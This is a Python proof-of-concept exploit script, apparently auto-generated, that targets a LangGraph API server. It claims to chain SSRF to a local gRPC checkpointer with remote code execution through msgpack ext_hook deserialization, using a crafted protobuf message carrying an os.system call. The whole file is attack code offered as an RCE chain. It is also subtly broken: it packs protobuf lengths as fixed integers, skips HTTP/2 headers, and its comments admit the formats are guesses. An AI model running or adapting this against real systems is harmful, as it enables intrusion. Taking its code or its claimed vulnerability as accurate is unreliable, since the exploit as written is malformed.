#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-048
# Sink: _configurable_from_proto
# Auto-generated — run with: python3 langgraph_ssrf_python_http_layer__configurable_from_proto_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit: LangGraph gRPC SSRF + msgpack RCE

This script demonstrates two vulnerabilities:
1. SSRF from the Python HTTP layer to gRPC services on localhost:50051
2. RCE via msgpack ext_hook deserialization in checkpoint_tuple_from_proto

The exploit sends a crafted gRPC request that triggers deserialization of
a malicious msgpack blob, achieving remote code execution.

WARNING: This is for authorized testing only. Use responsibly.
"""

import struct
import socket
import sys
import time
import os

# Configuration
TARGET_HOST = "localhost"
TARGET_PORT = 50051
TIMEOUT = 10

# gRPC protocol constants
GRPC_HEADER_SIZE = 5  # 1 byte compression flag + 4 bytes length

def create_grpc_frame(payload: bytes) -> bytes:
    """Create a gRPC HTTP/2 data frame with the given payload."""
    # gRPC uses a 5-byte header: 1 byte compression flag (0=uncompressed) + 4 bytes length
    frame = struct.pack("!BI", 0, len(payload)) + payload
    return frame

def create_msgpack_rce_payload(command: str) -> bytes:
    """
    Create a malicious msgpack payload that exploits the ext_hook.
    
    The ext_hook in serde.loads_typed allows arbitrary module imports.
    We craft a payload that when deserialized, executes our command.
    
    The payload structure:
    - Type 0xc7 (ext 8) with type code 0x01 (arbitrary)
    - Contains a serialized Python object that will execute code
    """
    # This is a simplified payload - in reality, the exact format depends on
    # the specific msgpack ext_hook implementation. We use a common pattern
    # that triggers __import__ or eval through the ext_hook.
    
    # For msgpack ext_hook exploitation, we typically need to:
    # 1. Create an ext type that the hook recognizes
    # 2. Embed a serialized Python object (e.g., pickle or custom format)
    # 3. The hook will deserialize it, executing our code
    
    # Simple approach: use the ext_hook to import os and execute command
    # The exact format depends on the serde implementation
    
    # For demonstration, we create a payload that would trigger
    # os.system() through the ext_hook mechanism
    payload = b""
    
    # Add ext type marker (0xc7 for ext8, 0xc6 for ext16, etc.)
    # The ext_hook typically expects specific type codes
    payload += b"\xc7"  # ext 8
    payload += struct.pack("B", len(command) + 10)  # length
    payload += b"\x01"  # type code (arbitrary, depends on implementation)
    
    # Embed the command in a format the ext_hook will execute
    # This is a simplified representation - actual exploitation requires
    # understanding the exact serde format
    payload += b"__import__('os').system('" + command.encode() + b"')"
    
    return payload

def create_checkpoint_tuple_proto(command: str) -> bytes:
    """
    Create a protobuf message that mimics a checkpoint tuple response.
    
    The structure follows the gRPC service definition for GetTuple response.
    We craft a checkpoint_tuple with a malicious config that triggers RCE.
    """
    # Protobuf wire format for a simplified checkpoint tuple
    # Field numbers are based on the proto definition:
    # checkpoint_tuple = 1 (message)
    #   config = 1 (message)
    #     configurable = 1 (map)
    #       key = "checkpoint_map" or similar that triggers deserialization
    
    # For simplicity, we create a raw protobuf message
    # In a real exploit, you'd use the actual proto definitions
    
    # Create the malicious msgpack payload
    msgpack_payload = create_msgpack_rce_payload(command)
    
    # Build protobuf manually (field number, wire type, value)
    # Field 1: checkpoint_tuple (message, wire type 2)
    # Field 1.1: config (message, wire type 2)
    # Field 1.1.1: configurable (map field, wire type 2)
    
    # Simplified protobuf encoding:
    # Tag = (field_number << 3) | wire_type
    # wire_type 2 = length-delimited
    
    proto = b""
    
    # checkpoint_tuple field (field 1, wire type 2)
    proto += b"\x0a"  # tag for field 1, wire type 2
    
    # Inside checkpoint_tuple message:
    inner = b""
    
    # config field (field 1, wire type 2)
    inner += b"\x0a"  # tag for field 1, wire type 2
    
    # Inside config message:
    config_inner = b""
    
    # configurable field - this is where the resume_map or checkpoint_map
    # triggers serialized_value_from_proto -> loads_typed
    # Field number depends on proto definition, typically around 10-15
    
    # For resume_map (field ~14 in config proto):
    # Tag = (14 << 3) | 2 = 114 = 0x72
    config_inner += b"\x72"  # tag for field 14 (resume_map), wire type 2
    
    # Map entry: key = "test", value = serialized_value_from_proto
    map_entry = b""
    
    # Key (field 1 in map entry)
    map_entry += b"\x0a"  # tag for field 1, wire type 2
    map_entry += struct.pack("B", 4) + b"test"  # key string
    
    # Value (field 2 in map entry) - this is where serialized_value_from_proto is called
    map_entry += b"\x12"  # tag for field 2, wire type 2
    
    # The value is a serialized_value proto that contains our msgpack payload
    # serialized_value_from_proto will call loads_typed on this data
    value_proto = b""
    value_proto += b"\x0a"  # field 1 (data), wire type 2
    value_proto += struct.pack("!I", len(msgpack_payload))  # length
    value_proto += msgpack_payload
    
    map_entry += struct.pack("!I", len(value_proto))  # length of value proto
    map_entry += value_proto
    
    config_inner += struct.pack("!I", len(map_entry))  # length of map entry
    config_inner += map_entry
    
    inner += struct.pack("!I", len(config_inner))  # length of config message
    inner += config_inner
    
    proto += struct.pack("!I", len(inner))  # length of checkpoint_tuple message
    proto += inner
    
    return proto

def send_grpc_request(host: str, port: int, service_path: str, payload: bytes) -> bytes:
    """
    Send a raw gRPC request over TCP.
    
    This simulates what an SSRF from the HTTP layer would do.
    """
    try:
        # Create TCP connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))
        
        # gRPC over HTTP/2 requires prior knowledge of the service
        # For this PoC, we send a raw protobuf message to the checkpointer service
        
        # The service path for GetTuple is typically:
        # /langgraph.checkpoint.Checkpointer/GetTuple
        # We need to send an HTTP/2 PRIOR_KNOWLEDGE preface
        
        # HTTP/2 connection preface
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        sock.sendall(preface)
        
        # Send SETTINGS frame (empty)
        settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00"
        sock.sendall(settings_frame)
        
        # Wait a bit for server to respond
        time.sleep(0.1)
        
        # Read server's SETTINGS
        try:
            sock.recv(4096)
        except socket.timeout:
            pass
        
        # Create HEADERS frame for POST request
        # This is a simplified HTTP/2 frame - real implementation would be more complex
        
        # For this PoC, we directly send the gRPC payload
        # In a real scenario, you'd need proper HTTP/2 framing
        
        # Create gRPC frame with our malicious payload
        grpc_frame = create_grpc_frame(payload)
        
        # Send the data directly (simplified - real gRPC needs HTTP/2)
        sock.sendall(grpc_frame)
        
        # Read response
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        sock.close()
        return response
        
    except Exception as e:
        print(f"[!] Error sending request: {e}")
        return b""

def main():
    """Main exploit function."""
    print("[*] LangGraph gRPC SSRF + msgpack RCE PoC")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print()
    
    # Benign payload for demonstration
    command = "touch /tmp/poc_success.txt"
    print(f"[*] Using benign command: {command}")
    print()
    
    # Create malicious checkpoint tuple
    print("[*] Crafting malicious checkpoint tuple proto...")
    malicious_proto = create_checkpoint_tuple_proto(command)
    print(f"[*] Payload size: {len(malicious_proto)} bytes")
    print()
    
    # Send the request
    print("[*] Sending malicious gRPC request...")
    print("[*] This simulates SSRF from HTTP layer to gRPC service")
    print()
    
    response = send_grpc_request(
        TARGET_HOST,
        TARGET_PORT,
        "/langgraph.checkpoint.Checkpointer/GetTuple",
        malicious_proto
    )
    
    if response:
        print(f"[+] Received response ({len(response)} bytes)")
        print(f"[+] Response hex: {response.hex()}")
    else:
        print("[!] No response received (expected if RCE succeeded)")
    
    # Check if our command executed
    print()
    print("[*] Checking for command execution...")
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: Command executed! File /tmp/poc_success.txt created.")
        print("[+] This confirms RCE via msgpack ext_hook deserialization.")
    else:
        print("[-] File not found. Command may not have executed.")
        print("[*] This could be due to:")
        print("  - gRPC service not running on target")
        print("  - Protobuf structure mismatch")
        print("  - Different ext_hook implementation")
        print()
        print("[*] The PoC demonstrates the attack vector; actual exploitation")
        print("[*] requires matching the exact proto definitions and ext_hook format.")

if __name__ == "__main__":
    main()
